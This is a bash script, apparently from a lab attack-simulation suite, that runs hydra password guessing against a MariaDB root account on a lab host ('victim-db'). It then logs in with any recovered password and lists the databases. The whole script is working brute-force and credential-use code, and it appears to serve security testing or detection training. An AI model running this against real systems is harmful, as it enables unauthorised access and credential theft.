#!/bin/bash
# Attack 5: MariaDB password guessing against the root account.
source /attacks/lib.sh
banner "Attack 5: Database brute force (hydra)" "T1110.001 Password Guessing"

require_lab_target victim-db

hydra \
  -l root \
  -P "$WORDLISTS/passwords.txt" \
  -t 4 -f -V \
  -o "$OUT/05-hydra-mysql.txt" \
  mysql://victim-db 2>&1 | grep -vE '^\[ATTEMPT\]' || true

pass=$(grep -oP 'password: \K\S+' "$OUT/05-hydra-mysql.txt" | head -1 || true)
if [[ -z "$pass" ]]; then
  echo "[result] No password found"; exit 1
fi
echo "[result] Found the root password"

# Use it: list the databases (read-only).
mariadb -h victim-db -u root -p"$pass" --skip-ssl -e 'SHOW DATABASES;' | tee "$OUT/05-db-login.txt"
done_msg
